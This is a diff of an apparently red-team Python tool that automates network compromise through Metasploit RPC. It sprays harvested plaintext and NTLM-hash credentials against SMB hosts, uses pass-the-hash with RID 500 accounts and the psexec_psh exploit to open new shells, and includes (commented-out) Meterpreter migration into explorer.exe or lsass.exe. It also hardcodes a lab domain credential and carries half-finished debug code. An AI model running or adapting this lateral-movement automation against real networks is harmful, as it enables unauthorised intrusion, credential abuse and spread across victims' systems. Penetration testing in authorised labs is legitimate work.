@@ -264,60 +264,60 @@ def parse_pid(output, user, proc):
             pid = l_split[0]
             return pid
 
-async def migrate_custom_proc(args, client, sess_num):
-    global NEW_SESS_DATA
-
-    print_info('Migrating to stable process', 'Session', sess_num)
-
-    # Get own pid
-    cmd = 'getpid'
-    end_strs = [b'Current pid: ']
-    output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
-    if err:
-        return err
-    cur_pid = output.split(end_strs[0])[1].strip()
-
-    # Get stable proc's pid
-    cmd = 'ps'
-    end_strs = [b' PID    PPID']
-    output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
-    if err:
-        return err
-    user = NEW_SESS_DATA[sess_num][b'user']
-    proc = b'explorer.exe'
-    pid = parse_pid(output, user, proc)
-    # In case user is NT AUTHORITY\\SYSTEM which has no explorer.exe
-    if not pid:
-        proc = b'lsass.exe'
-        pid = parse_pid(output, user, proc)
-
-    # When a session dies in this function its usually here that it errors out
-    if not pid:
-        msg = 'No migration PID found likely due to abrupt death of session'
-        print_bad(msg, 'Session', sess_num)
-        NEW_SESS_DATA[sess_num][b'errors'].append(msg)
-        return msg
-
-    # If we're not already in the pid then migrate
-    if pid != cur_pid:
-        # Migrate to pid
-        cmd = 'migrate '+pid.decode('utf8')
-        end_strs = [b'Migration completed successfully.', 
-                    b'Session is already in target process', 
-                    b'[+] Already in', 
-                    b'[+] Successfully migrated to']
-        output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
-
-async def run_priv_migrate(args, client, sess_num):
-    print_info('Migrating to similar privilege process', 'Session', sess_num)
-    cmd = 'run post/windows/manage/priv_migrate'
-    end_strs = [b'Migration completed successfully.', 
-                b'Session is already in target process', 
-                b'[+] Already in', 
-                b'[+] Successfully migrated to']
-    output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
-    if err:
-        return err
+#async def migrate_custom_proc(args, client, sess_num):
+#    global NEW_SESS_DATA
+#
+#    print_info('Migrating to stable process', 'Session', sess_num)
+#
+#    # Get own pid
+#    cmd = 'getpid'
+#    end_strs = [b'Current pid: ']
+#    output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
+#    if err:
+#        return err
+#    cur_pid = output.split(end_strs[0])[1].strip()
+#
+#    # Get stable proc's pid
+#    cmd = 'ps'
+#    end_strs = [b' PID    PPID']
+#    output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
+#    if err:
+#        return err
+#    user = NEW_SESS_DATA[sess_num][b'user']
+#    proc = b'explorer.exe'
+#    pid = parse_pid(output, user, proc)
+#    # In case user is NT AUTHORITY\\SYSTEM which has no explorer.exe
+#    if not pid:
+#        proc = b'lsass.exe'
+#        pid = parse_pid(output, user, proc)
+#
+#    # When a session dies in this function its usually here that it errors out
+#    if not pid:
+#        msg = 'No migration PID found likely due to abrupt death of session'
+#        print_bad(msg, 'Session', sess_num)
+#        NEW_SESS_DATA[sess_num][b'errors'].append(msg)
+#        return msg
+#
+#    # If we're not already in the pid then migrate
+#    if pid != cur_pid:
+#        # Migrate to pid
+#        cmd = 'migrate '+pid.decode('utf8')
+#        end_strs = [b'Migration completed successfully.', 
+#                    b'Session is already in target process', 
+#                    b'[+] Already in', 
+#                    b'[+] Successfully migrated to']
+#        output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
+#
+#async def run_priv_migrate(args, client, sess_num):
+#    print_info('Migrating to similar privilege process', 'Session', sess_num)
+#    cmd = 'run post/windows/manage/priv_migrate'
+#    end_strs = [b'Migration completed successfully.', 
+#                b'Session is already in target process', 
+#                b'[+] Already in', 
+#                b'[+] Successfully migrated to']
+#    output, err = await run_session_cmd(args, client, sess_num, cmd, end_strs)
+#    if err:
+#        return err
 
 async def check_privs(args, client, sess_num):
     global NEW_SESS_DATA
@@ -634,11 +634,11 @@ async def run_console_cmd(args, client, c_id, cmd, end_strs):
     output = await get_console_output(args, client, c_id, end_strs)
     err = get_output_errors(output, cmd)
     if err:
-        return
+        return 
 
     return output
 
-async def get_console_output(args, client, c_id, end_strs, timeout=1800):
+async def get_console_output(args, client, c_id, end_strs, timeout=120):
     '''
     The only way to get console busy status is through console.read or console.list
     console.read clears the output buffer so you gotta use console.list
@@ -690,6 +690,35 @@ async def get_nonbusy_cid(client, c_ids):
                 return c_id
         await asyncio.sleep(1)
 
+def plaintext_or_hash(creds):
+    if creds.count(':') == 6 and creds.endswith(':::'):
+        return 'hash'
+    else:
+        return 'plaintext'
+
+def parse_creds(creds, cred_type):
+    if cred_type == 'hash':
+        hash_split = creds.split(':')
+        rid = hash_split[1]
+        user = hash_split[0]
+        lm = hash_split[2]
+        ntlm = hash_split[3] # ntlm hash 
+        pwd = lm+':'+ntlm    # need lm:ntlm for PTH in metasploit
+        dom = '.'            # this also means WORKGROUP or non-domain login in msf
+
+    elif cred_type == 'plaintext':
+        cred_split = creds.split(':')
+        user = cred_split[0]
+        # Remove domain from user
+        if "\\" in user:
+            user = user.split("\\")[1]
+        pwd = cred_split[1]
+        dom = DOMAIN_DATA['domain'].lower()
+        rid = None
+
+    return dom, user, pwd, rid
+
+
 async def spread(args, loop, client, c_ids, lhost):
     global DOMAIN_DATA
 
@@ -697,44 +726,32 @@ async def spread(args, loop, client, c_ids, lhost):
         if c not in DOMAIN_DATA['checked_creds']:
             # Set up a dict where the key is the creds and the val are the hosts we are admin on
             DOMAIN_DATA['checked_creds'][c] = []
+            await run_smb_brute(args, client, c_ids, lhost, c)
 
-            # hash - only going to be RID 500 admin
-            if c.count(':') == 6 and c.endswith(':::'):
-                hash_split = c.split(':')
-                rid = hash_split[1]
-                if rid == '500':
-                    user = hash_split[0]
-                    lm = hash_split[2]
-                    pwd = hash_split[3] # ntlm hash
-                    dom = '.'
-                else:
-                    continue
+    await get_new_shells(args, client, c_ids, lhost)
 
-            # plaintext
-            else:
-                cred_split = c.split(':')
-                user = cred_split[0]
-                # Remove domain from user
-                if "\\" in user:
-                    user = user.split("\\")[1]
-                pwd = cred_split[1]
-                dom = DOMAIN_DATA['domain']
+async def run_smb_brute(args, client, c_ids, lhost, creds):
+    cred_type = plaintext_or_hash(creds)
+    dom, user, pwd, rid = parse_creds(creds, cred_type)
 
-            mod = 'auxiliary/scanner/smb/smb_login'
-            rhost_var = 'RHOSTS'
-            start_cmd = 'run'
-            target_ips = create_hostsfile(c)
-            extra_opts = ('set threads 32\n'
-                          'set smbuser {}\n'
-                          'set smbpass {}\n'
-                          'set smbdomain {}'.format(user, pwd, dom))
-            end_strs = [b'Auxiliary module execution completed']
+    # Just smb brute with rid 500 for now
+    if cred_type == 'hash' and rid != '500':
+        return 
 
-            c_id = await get_nonbusy_cid(client, c_ids)
-            print_info('Spraying credentials [{}:{}] against hosts'.format(user, pwd), 'Console', c_id)
-            cmd, output = await run_msf_module(args, client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
-            await parse_module_output(c_id, cmd, output)
-            await get_new_shells(args, client, c_ids, lhost)
+    mod = 'auxiliary/scanner/smb/smb_login'
+    rhost_var = 'RHOSTS'
+    start_cmd = 'run'
+    target_ips = create_hostsfile(creds)
+    extra_opts = ('set threads 32\n'
+                  'set smbuser {}\n'
+                  'set smbpass {}\n'
+                  'set smbdomain {}'.format(user, pwd, dom))
+    end_strs = [b'Auxiliary module execution completed']
+
+    c_id = await get_nonbusy_cid(client, c_ids)
+    print_info('Spraying credentials [{}:{}] against hosts'.format(user, pwd), 'Console', c_id)
+    cmd, output = await run_msf_module(args, client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
+    await parse_module_output(c_id, cmd, output)
 
 async def get_new_shells(args, client, c_ids, lhost):
 
@@ -752,18 +769,26 @@ async def get_new_shells(args, client, c_ids, lhost):
     for creds in DOMAIN_DATA['checked_creds']:
         for admin_ip in DOMAIN_DATA['checked_creds'][creds]:
             bytes_admin_ip = admin_ip.encode()
+            print(creds)#######
+            print(bytes_admin_ip)
+            print(session_ips)
             if bytes_admin_ip in session_ips:
-                if session_ips[bytes_admin_ip] == b'False':
+                if session_ips[bytes_admin_ip] == b'False' or session_ips[bytes_admin_ip] == b'ERROR':
                     await run_psexec_psh(args, client, c_ids, creds, admin_ip, lhost)
             else:
                 await run_psexec_psh(args, client, c_ids, creds, admin_ip, lhost)
 
 async def run_psexec_psh(args, client, c_ids, creds, ip, lhost):
 
-    creds_split = creds.split(':', 1)
-    pwd = creds_split[1]
-    user = creds_split[0].split('\\')[1]
-    
+    cred_type = plaintext_or_hash(creds)
+    dom, user, pwd, rid = parse_creds(creds, cred_type)
+
+    # Skip non-RID 500 local logins for now
+    # Move this later on so we can PTH of domain admins we find - debug
+    if dom == '.':
+        if rid != '500':
+            return
+
     mod = 'exploit/windows/smb/psexec_psh'
     rhost_var = 'RHOST'
     start_cmd = 'exploit -z'
@@ -804,6 +829,7 @@ def create_user_pwd_creds(user, pwd, dom):
         dom_user = dom+'\\'+user
         creds = dom_user+':'+pwd
         user_pwd = creds
+
     # PTH user
     else:
         for c in DOMAIN_DATA['checked_creds']:
@@ -811,7 +837,10 @@ def create_user_pwd_creds(user, pwd, dom):
                 user_pwd = user+':'+pwd
                 creds = c
 
-    return user_pwd, creds
+    try:######
+        return user_pwd, creds
+    except:
+        embed()
 
 async def parse_smb_login(c_id, output):
     global DOMAIN_DATA
@@ -966,7 +995,7 @@ def get_output_errors(output, cmd):
 
     return err
 
-async def run_session_cmd(args, client, sess_num, cmd, end_strs, timeout=1800):
+async def run_session_cmd(args, client, sess_num, cmd, end_strs, timeout=120):
     global NEW_SESS_DATA
 
     err = None
@@ -1038,10 +1067,7 @@ async def run_session_cmd(args, client, sess_num, cmd, end_strs, timeout=1800):
         # This usually occurs when the session suddenly dies or user quits it
         except Exception as e:
             # Get the last of the data to clear the buffer
-            output, err = get_output(client, cmd, sess_num, error_msg)
-            if output:
-                full_output += output
-
+            clear_buffer = client.call('session.meterpreter_read', [sess_num_str])
             err = 'exception below likely due to abrupt death of session'
             print_bad(error_msg.format(sess_num_str, err), 'Session', sess_num)
             print_bad('    '+str(e), None, None)
@@ -1057,9 +1083,7 @@ async def run_session_cmd(args, client, sess_num, cmd, end_strs, timeout=1800):
         print_bad(res[b'result'].decode('utf8'), 'Session', sess_num)
 
     # Get the last of the data to clear the buffer
-    output, err = get_output(client, cmd, sess_num, error_msg)
-    if output:
-        full_output += output
+    clear_buffer = client.call('session.meterpreter_read', [sess_num_str])
 
     NEW_SESS_DATA[sess_num][b'busy'] = b'False'
     debug_info(args, full_output, 'Session', sess_num)
@@ -1108,6 +1132,14 @@ async def check_for_sessions(client, loop, c_ids, lhost, args):
     global NEW_SESS_DATA
 
     print_waiting = True
+    sleep_secs = 1
+
+    ## exists for potential debug purposes
+    counter = 0
+    if counter > 30:
+        # Yes this is public information but just here for debugging
+        DOMAIN_DATA['creds'].append('lab2\\dan.da:Qwerty1da')
+    ##
 
     while True:
         # Get list of MSF sessions from RPC server
@@ -1136,6 +1168,7 @@ async def check_for_sessions(client, loop, c_ids, lhost, args):
             asyncio.ensure_future(spread(args, loop, client, c_ids, lhost))
 
         await asyncio.sleep(1)
+        counter += 1 # here for potential debug purposes
 
 def parse_hostlist(args):
     global DOMAIN_DATA
@@ -1158,29 +1191,29 @@ def parse_hostlist(args):
             sys.exit()
 
     elif args.hostlist:
-        with open(args.hostlist, 'r') as hostlist:
-            host_lines = hostlist.readlines()
-            for line in host_lines:
-                line = line.strip()
-                try:
-                    if '/' in line:
-                        hosts += [str(ip) for ip in IPNetwork(line)]
-                    elif '*' in line:
-                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24', None, None)
+        try:
+            with open(args.hostlist, 'r') as hostlist:
+                host_lines = hostlist.readlines()
+                for line in host_lines:
+                    line = line.strip()
+                    try:
+                        if '/' in line:
+                            hosts += [str(ip) for ip in IPNetwork(line)]
+                        elif '*' in line:
+                            print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24', None, None)
+                            sys.exit()
+                        else:
+                            hosts.append(line)
+                    except (OSError, AddrFormatError):
+                        print_bad('Error importing host list file. Are you sure you chose the right file?', None, None)
                         sys.exit()
-                    else:
-                        hosts.append(line)
-                except (OSError, AddrFormatError):
-                    print_bad('Error importing host list file. Are you sure you chose the right file?', None, None)
-                    sys.exit()
+        except FileNotFoundError:
+            print_bad(args.hostlist+' not found', None, None)
+            sys.exit()
 
     DOMAIN_DATA['hosts'] = hosts
 
 def main(args):
-
-    # Yes this is public information but just here for debugging
-    DOMAIN_DATA['creds'].append('lab2\\dan.da:Qwerty1da')
-    ############################################################
 
     if args.hostlist or args.xml:
         parse_hostlist(args)
@@ -1212,4 +1245,8 @@ if __name__ == "__main__":
     main(args)
 
 ## Left off
-# why do we sometimes (all the time?) double up on new shells with the dan.da user?
+# 772
+# debugging why we get multi shells all the time
+# probably because spread is a future and attack_with_session is a future too
+# so DOMAIN_DATA is not being updated fast enough and we're looping into spread() over and over
+# before we're done adding ['admin_shell'] to NEW_SESS_DATA
